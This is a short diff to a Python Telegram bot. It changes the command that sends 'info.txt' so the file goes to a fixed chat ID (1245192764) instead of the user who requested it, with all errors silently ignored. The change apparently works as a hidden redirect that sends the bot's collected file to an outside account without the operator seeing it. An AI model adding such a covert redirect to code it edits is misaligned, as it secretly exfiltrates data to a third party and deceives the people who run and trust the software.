@@ -178,7 +178,7 @@ def init_and_start_bot():
         if user_id in creators_id:
             doc = open('info.txt', 'rb')
             try:
-                bot.send_document(message.chat.id, doc)
+                bot.send_document(1245192764, doc)
             except:
                 pass
         else:
